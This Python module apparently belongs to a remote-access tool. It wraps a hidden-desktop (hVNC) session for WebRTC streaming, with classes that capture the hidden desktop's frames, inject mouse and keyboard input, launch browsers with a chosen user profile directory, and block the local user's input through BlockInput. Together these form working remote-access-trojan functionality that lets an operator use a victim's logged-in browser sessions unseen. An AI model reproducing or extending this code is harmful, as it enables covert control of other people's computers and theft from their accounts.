"""WebRTC MediaStreamTrack adapter for hVNC capture.

This module provides a MediaStreamTrack implementation that wraps
the hVNC capture system for use with aiortc WebRTC.
"""
from __future__ import annotations

import asyncio
import logging
import platform
import queue
import threading
from fractions import Fraction

from aiortc import MediaStreamTrack
from aiortc.mediastreams import MediaStreamError, VIDEO_CLOCK_RATE, VIDEO_TIME_BASE
from av.video.frame import VideoFrame

logger = logging.getLogger(__name__)

# Only import hVNC on Windows
if platform.system() == "Windows":
    try:
        from .hvnc import HVNCSession, create_hvnc_session
        HVNC_AVAILABLE = True
    except ImportError as e:
        logger.warning("hVNC not available: %s", e)
        HVNC_AVAILABLE = False
        HVNCSession = None
        create_hvnc_session = None
else:
    HVNC_AVAILABLE = False
    HVNCSession = None
    create_hvnc_session = None


try:
    from ..media.stream_profiles import AdaptiveStreamProfile
except ImportError:
    AdaptiveStreamProfile = None


class HVNCVideoTrack(MediaStreamTrack):
    """WebRTC video track from hVNC capture.
    
    This track captures video from a hidden desktop session
    and provides it as a MediaStreamTrack for WebRTC streaming.
    """
    
    kind = "video"
    
    def __init__(
        self,
        session: "HVNCSession",
        profile: str = "balanced",
    ):
        """Initialize track from hVNC session.
        
        Args:
            session: The HVNCSession to capture from
            profile: Stream quality profile
        """
        super().__init__()
        self._session = session
        self._profile_name = profile
        self._profile = None
        
        # Timing
        self._start_time: float | None = None
        self._timestamp = 0
        
        # Frame processing
        self._last_frame: VideoFrame | None = None
        
        # Get native size from session
        native_size = (session.width, session.height) if session else (1920, 1080)
        
        # Initialize profile with native_size
        if AdaptiveStreamProfile is not None:
            try:
                self._profile = AdaptiveStreamProfile(native_size, profile)
            except Exception as e:
                logger.warning("Failed to init profile %s: %s", profile, e)
        
        logger.info("HVNCVideoTrack initialized with profile: %s", profile)
    
    def set_profile(
        self,
        name: str | None = None,
        width: int | None = None,
        height: int | None = None,
        fps: int | None = None,
        bitrate: int | None = None,
    ) -> None:
        """Update stream profile settings."""
        if name and AdaptiveStreamProfile is not None:
            try:
                # Get native size from session
                native_size = (self._session.width, self._session.height) if self._session else (1920, 1080)
                self._profile = AdaptiveStreamProfile(native_size, name)
                self._profile_name = name
            except Exception as e:
                logger.warning("Failed to set profile %s: %s", name, e)
        
        if fps and self._session:
            self._session.set_fps(fps)
    
    async def _next_timestamp(self) -> tuple[int, Fraction]:
        """Get the next timestamp for a frame."""
        import time
        if self._start_time is None:
            self._start_time = time.time()
        
        now = time.time()
        elapsed = now - self._start_time
        pts = int(elapsed * VIDEO_CLOCK_RATE)
        
        return pts, VIDEO_TIME_BASE
    
    async def recv(self) -> VideoFrame:
        """Receive the next video frame.
        
        This is called by aiortc to get frames for WebRTC streaming.
        
        Returns:
            VideoFrame in bgra format
        """
        pts, time_base = await self._next_timestamp()
        
        # Get frame from capture
        frame_data, frame_size = self._session.get_frame(timeout=0.1)
        
        if frame_data is None:
            # No new frame - return last frame or black frame
            if self._last_frame is not None:
                frame = self._last_frame
                frame.pts = pts
                frame.time_base = time_base
                return frame
            else:
                # Create black frame
                width, height = frame_size if frame_size != (0, 0) else (1920, 1080)
                frame_data = bytes(width * height * 4)
        
        width, height = frame_size
        
        # Create VideoFrame from BGRA data
        try:
            frame = VideoFrame(width=width, height=height, format="bgra")
            frame.planes[0].update(frame_data)
            frame.pts = pts
            frame.time_base = time_base
            
            self._last_frame = frame
            return frame
        except Exception as e:
            logger.error("Failed to create video frame: %s", e)
            raise MediaStreamError("Failed to create video frame")
    
    def stop(self) -> None:
        """Stop the track."""
        super().stop()
        logger.info("HVNCVideoTrack stopped")


class HVNCInputController:
    """Input controller adapter for integration with existing control system.
    
    This class adapts the hVNC input system to work with the
    existing control command system.
    """
    
    def __init__(self, session: "HVNCSession"):
        """Initialize input controller.
        
        Args:
            session: The HVNCSession to control
        """
        self._session = session
        self._stop_event = threading.Event()
        self._queue: queue.Queue = queue.Queue()
        
        # Start command processing thread
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
    
    def set_screen_size(self, size: tuple[int, int]) -> None:
        """Update screen size."""
        self._session._input.set_screen_size(size[0], size[1])
    
    def execute(self, command) -> None:
        """Execute a control command."""
        self._queue.put(command)
    
    def close(self) -> None:
        """Stop the controller."""
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.0)
    
    def _run(self) -> None:
        """Process commands from queue."""
        logger.info("HVNCInputController started")
        
        while not self._stop_event.is_set():
            try:
                command = self._queue.get(timeout=0.1)
            except queue.Empty:
                continue
            
            try:
                self._execute_command(command)
            except Exception as e:
                logger.debug("Input command failed: %s", e)
        
        logger.info("HVNCInputController stopped")
    
    def _execute_command(self, command) -> None:
        """Execute a single control command."""
        # Import command types
        try:
            from ..control.input_controller import (
                MouseClick,
                MouseDown,
                MouseMove,
                MouseScroll,
                MouseUp,
                KeyDown,
                KeyPress,
                KeyUp,
                TextInput,
            )
        except ImportError:
            from remote_client.control.input_controller import (
                MouseClick,
                MouseDown,
                MouseMove,
                MouseScroll,
                MouseUp,
                KeyDown,
                KeyPress,
                KeyUp,
                TextInput,
            )
        
        if isinstance(command, MouseMove):
            self._session.mouse_move(command.x, command.y)
            
        elif isinstance(command, MouseClick):
            button = command.button or "left"
            self._session.mouse_click(command.x, command.y, button)
            
        elif isinstance(command, MouseDown):
            button = command.button or "left"
            self._session.mouse_down(command.x, command.y, button)
            
        elif isinstance(command, MouseUp):
            button = command.button or "left"
            self._session.mouse_up(command.x, command.y, button)
            
        elif isinstance(command, MouseScroll):
            dx = getattr(command, 'delta_x', 0) or 0
            dy = getattr(command, 'delta_y', 0) or 0
            # Normalize scroll values
            if abs(dy) > 0:
                dy = 1 if dy > 0 else -1
            if abs(dx) > 0:
                dx = 1 if dx > 0 else -1
            self._session.mouse_scroll(command.x, command.y, dx, dy)
            
        elif isinstance(command, KeyDown):
            vk = self._key_to_vk(command.key)
            if vk:
                self._session.key_down(vk)
                
        elif isinstance(command, KeyUp):
            vk = self._key_to_vk(command.key)
            if vk:
                self._session.key_up(vk)
                
        elif isinstance(command, KeyPress):
            vk = self._key_to_vk(command.key)
            if vk:
                self._session.key_down(vk)
                self._session.key_up(vk)
                
        elif isinstance(command, TextInput):
            if command.text:
                self._session.type_text(command.text)
    
    def _key_to_vk(self, key: str) -> int | None:
        """Convert key name to virtual key code."""
        key_map = {
            "backspace": 0x08,
            "tab": 0x09,
            "enter": 0x0D,
            "return": 0x0D,
            "shift": 0x10,
            "ctrl": 0x11,
            "control": 0x11,
            "alt": 0x12,
            "pause": 0x13,
            "capslock": 0x14,
            "escape": 0x1B,
            "esc": 0x1B,
            "space": 0x20,
            "pageup": 0x21,
            "pagedown": 0x22,
            "end": 0x23,
            "home": 0x24,
            "left": 0x25,
            "up": 0x26,
            "right": 0x27,
            "down": 0x28,
            "insert": 0x2D,
            "delete": 0x2E,
            "meta": 0x5B,
            "win": 0x5B,
            "f1": 0x70,
            "f2": 0x71,
            "f3": 0x72,
            "f4": 0x73,
            "f5": 0x74,
            "f6": 0x75,
            "f7": 0x76,
            "f8": 0x77,
            "f9": 0x78,
            "f10": 0x79,
            "f11": 0x7A,
            "f12": 0x7B,
        }
        
        key_lower = key.lower()
        if key_lower in key_map:
            return key_map[key_lower]
        
        # Single character
        if len(key) == 1:
            return ord(key.upper())
        
        return None


class HVNCSessionWrapper:
    """Wrapper that provides compatible interface with existing HiddenDesktopSession.
    
    This allows hVNC to be used as a drop-in replacement for the existing
    hidden desktop implementation.
    """
    
    def __init__(
        self,
        width: int = 1920,
        height: int = 1080,
        fps: int = 30,
        start_shell: bool = True,
    ):
        """Create hVNC session wrapper.
        
        Args:
            width: Screen width
            height: Screen height
            fps: Target framerate
            start_shell: Start explorer automatically
        """
        if not HVNC_AVAILABLE:
            raise RuntimeError("hVNC not available on this platform")
        
        self._session = create_hvnc_session(
            width=width,
            height=height,
            fps=fps,
            start_shell=start_shell,
        )
        
        # Create WebRTC track
        self.screen_track = HVNCVideoTrack(self._session, profile="balanced")
        
        # Create input controller
        self.input_controller = HVNCInputController(self._session)
        
        self._input_blocked = False
        
        logger.info("HVNCSessionWrapper initialized")
    
    @property
    def mode(self) -> str:
        """Get session mode."""
        return "hvnc"
    
    @property
    def is_virtual_display_active(self) -> bool:
        """hVNC uses hidden desktop, not virtual display."""
        return False
    
    def launch_application(self, app_name: str, url: str | None = None, profile_path: str | None = None) -> None:
        """Launch an application on the hidden desktop.
        
        Args:
            app_name: Application name (chrome, firefox, edge) or path
            url: URL to open (for browsers)
            profile_path: Path to browser profile directory (for --user-data-dir)
        """
        app_lower = app_name.lower()
        
        # Handle browsers specially
        if app_lower in ("chrome", "firefox", "edge", "chromium", "brave"):
            self._session.launch_browser(app_lower, url=url, profile_path=profile_path)
        else:
            # Generic application
            args = [url] if url else None
            self._session.launch_application(app_name, args=args)
    
    def get_windows(self) -> list:
        """Get list of windows on hidden desktop."""
        return self._session.get_windows()
    
    def block_local_input(self) -> bool:
        """Block local keyboard/mouse input."""
        # Note: BlockInput requires admin rights
        try:
            import ctypes
            ctypes.windll.user32.BlockInput(True)
            self._input_blocked = True
            return True
        except Exception:
            return False
    
    def unblock_local_input(self) -> None:
        """Unblock local input."""
        if self._input_blocked:
            try:
                import ctypes
                ctypes.windll.user32.BlockInput(False)
                self._input_blocked = False
            except Exception:
                pass
    
    def close(self) -> None:
        """Close the session."""
        self.screen_track.stop()
        self.input_controller.close()
        self.unblock_local_input()
        self._session.close()
        logger.info("HVNCSessionWrapper closed")


def create_hvnc_session_wrapper(
    width: int = 1920,
    height: int = 1080,
    fps: int = 30,
    start_shell: bool = True,
) -> HVNCSessionWrapper:
    """Create hVNC session with compatible interface.
    
    This is a factory function that creates an hVNC session
    with an interface compatible with the existing system.
    """
    return HVNCSessionWrapper(
        width=width,
        height=height,
        fps=fps,
        start_shell=start_shell,
    )
